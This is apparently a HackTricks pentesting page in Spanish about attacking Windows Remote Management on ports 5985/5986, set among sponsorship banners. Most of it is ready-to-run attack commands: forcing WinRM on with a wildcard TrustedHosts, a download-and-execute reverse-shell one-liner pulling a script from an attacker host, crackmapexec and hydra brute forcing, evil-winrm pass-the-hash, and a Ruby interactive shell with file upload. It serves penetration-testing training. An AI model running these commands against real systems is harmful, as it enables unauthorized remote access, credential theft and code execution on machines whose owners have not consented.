# 5985,5986 - Pentesting WinRM

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

√önete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de bugs!

**Perspectivas de Hacking**\
Invol√∫crate con contenido que profundiza en la emoci√≥n y desaf√≠os del hacking

**Noticias de Hacking en Tiempo Real**\
Mantente actualizado con el mundo del hacking a trav√©s de noticias e informaci√≥n en tiempo real

**√öltimos Anuncios**\
Mantente informado sobre los nuevos programas de recompensas por bugs y actualizaciones importantes de plataformas

**√önete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy!

## WinRM

[Windows Remote Management](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426\(v=vs.85\).aspx) (WinRM) es un protocolo de Microsoft que **permite la gesti√≥n remota de m√°quinas Windows** a trav√©s de HTTP(S) utilizando SOAP. En el backend utiliza WMI, por lo que se puede pensar en √©l como una API basada en HTTP para WMI.

Si WinRM est√° habilitado en la m√°quina, es trivial administrarla de forma remota desde PowerShell. De hecho, puedes simplemente acceder a una sesi√≥n remota de PowerShell en la m√°quina (¬°como si estuvieras usando SSH!)

La forma m√°s sencilla de detectar si WinRM est√° disponible es ver si el puerto est√° abierto. WinRM escuchar√° en uno de dos puertos:

* **5985/tcp (HTTP)**
* **5986/tcp (HTTPS)**

Si uno de estos puertos est√° abierto, WinRM est√° configurado y puedes intentar acceder a una sesi√≥n remota.

## **Iniciando Sesi√≥n WinRM**.

Podemos configurar PowerShell para trabajar con WinRM. Seg√∫n la documentaci√≥n de Microsoft, Enable-PSRemoting es un cmdlet que configura la computadora para recibir comandos remotos de PowerShell. Si tenemos acceso a un s√≠mbolo del sistema de PowerShell elevado en la v√≠ctima, podemos habilitarlo y agregar cualquier "atacante" como hosts de confianza. Podemos ejecutar los siguientes dos comandos:
```
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
Esto agrega un comod√≠n a la configuraci√≥n de trustedhosts. Ten cuidado con lo que eso implica. _Nota: Tambi√©n tuve que cambiar el tipo de red en mi m√°quina de ataque de "P√∫blica" a red "de Trabajo"._

Tambi√©n puedes **activar** WinRM **de forma remota** _\*\*\_usando \_wmic_:
```
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
### Comprobar si est√° configurado

Una vez que la m√°quina de ataque est√© configurada, usa la funci√≥n `Test-WSMan` para comprobar si el objetivo est√° configurado para WinRM. Deber√≠as ver informaci√≥n devuelta sobre la versi√≥n del protocolo y wsmid:

![](<../.gitbook/assets/image (161) (1).png>)

![](<../.gitbook/assets/image (162).png>)

En este caso, el primero est√° configurado y el segundo no lo est√°.

### Ejecutar un comando

Ahora podemos usar `Invoke-Command` de PowerShell para ejecutar remotamente un comando en el objetivo a trav√©s de WinRM. Para ejecutar remotamente `ipconfig` y ver la salida:
```
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../.gitbook/assets/image (163) (1).png>)

Tambi√©n puedes **ejecutar un comando de tu consola de PS actual a trav√©s de** _**Invoke-Command**_. Supongamos que tienes localmente una funci√≥n llamada _**enumeration**_ y quieres **ejecutarla en un ordenador remoto**, puedes hacerlo:
```ruby
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### Ejecutar un Script
```ruby
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### Obtener shell inverso
```ruby
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### Obtener una sesi√≥n de PS

O, si deseas ingresar directamente a una sesi√≥n interactiva de PowerShell, utiliza la funci√≥n `Enter-PSSession`:
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../.gitbook/assets/image (164).png>)

**La sesi√≥n se ejecutar√° en un nuevo proceso (wsmprovhost) dentro del "equipo v√≠ctima"**

### **Forzando la Apertura de WinRM**

Si realmente deseas utilizar PS Remoting y WinRM pero el objetivo no est√° configurado para ello, puedes "forzarlo" a trav√©s de un solo comando. No recomendar√≠a esto, pero si realmente deseas usar WinRM o PSRemoting, hazlo de esta manera. Por ejemplo, utilizando PSExec:
```
PS C:\tools\SysinternalsSuite> .\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
Ahora podemos ingresar a una sesi√≥n remota de PS en la v√≠ctima.

### Guardar y Restaurar sesiones

Esto **no funcionar√°** si el **idioma** est√° **restringido** en la computadora remota.
```ruby
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
Dentro de estas sesiones puedes cargar scripts de PS usando _Invoke-Command_
```ruby
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### Errores

Si encuentras el siguiente error:

`enter-pssession : La conexi√≥n al servidor remoto 10.10.10.175 fall√≥ con el siguiente mensaje de error: El cliente WinRM no puede procesar la solicitud. Si el esquema de autenticaci√≥n es diferente de Kerberos, o si la computadora cliente no est√° unida a un dominio, entonces se debe usar el transporte HTTPS o la m√°quina de destino debe ser agregada a la configuraci√≥n de TrustedHosts. Utiliza winrm.cmd para configurar TrustedHosts. Ten en cuenta que las computadoras en la lista de TrustedHosts podr√≠an no estar autenticadas. Puedes obtener m√°s informaci√≥n al respecto ejecutando el siguiente comando: winrm help config. Para m√°s informaci√≥n, consulta el tema de Ayuda sobre Soluci√≥n de problemas remotos.`

La soluci√≥n en el cliente (informaci√≥n de [aqu√≠](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

√önete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de bugs!

**Perspectivas de Hacking**\
Participa en contenido que explora la emoci√≥n y los desaf√≠os del hacking

**Noticias de Hacking en Tiempo Real**\
Mantente al d√≠a con el mundo del hacking a trav√©s de noticias e informaci√≥n en tiempo real

**√öltimos Anuncios**\
Mantente informado sobre los nuevos programas de recompensas por bugs y actualizaciones importantes de plataformas

**√önete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy!

## Conexi√≥n WinRM en Linux

### Fuerza Bruta

Ten cuidado, hacer fuerza bruta en WinRM podr√≠a bloquear a los usuarios.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### Usando evil-winrm
```ruby
gem install evil-winrm
```
Lee la **documentaci√≥n** en su github: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
Para usar evil-winrm para conectarse a una **direcci√≥n IPv6**, crea una entrada dentro de _**/etc/hosts**_ estableciendo un **nombre de dominio** para la direcci√≥n IPv6 y con√©ctate a ese dominio.

### Pasar el hash con evil-winrm
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
### Usando una m√°quina PS-docker

En lugar de ejecutar comandos de PowerShell directamente en la m√°quina de destino, tambi√©n puede usar una m√°quina Docker con PowerShell instalado para ejecutar comandos de forma remota. Esto puede ser √∫til para evitar dejar rastros en la m√°quina de destino. Aqu√≠ hay un ejemplo de c√≥mo hacerlo:

1. Cree una imagen Docker con PowerShell instalado:
```bash
docker build -t ps-docker .
```

2. Ejecute un contenedor basado en la imagen reci√©n creada:
```bash
docker run -it ps-docker
```

3. Una vez dentro del contenedor, puede ejecutar comandos de PowerShell como lo har√≠a normalmente en una m√°quina Windows.
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### Usando un script de ruby

**C√≥digo extra√≠do de aqu√≠: [https://alamot.github.io/winrm\_shell/](https://alamot.github.io/winrm\_shell/)**
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

* `port:5985 Microsoft-HTTPAPI`

## Referencias

* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## Comandos Autom√°ticos de HackTricks
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‚ÄòMySuperSecr3tPass123!‚Äô

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
‚Äã

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

√önete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de recompensas por errores.

**Perspectivas de Hacking**\
Participa en contenido que explora la emoci√≥n y los desaf√≠os del hacking.

**Noticias de Hacking en Tiempo Real**\
Mantente al d√≠a con el mundo del hacking a trav√©s de noticias e informaci√≥n en tiempo real.

**√öltimos Anuncios**\
Mantente informado sobre los nuevos programas de recompensas por errores que se lanzan y las actualizaciones cruciales de la plataforma.

**√önete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ¬°y comienza a colaborar con los mejores hackers hoy!

<details>

<summary><strong>Aprende a hackear AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
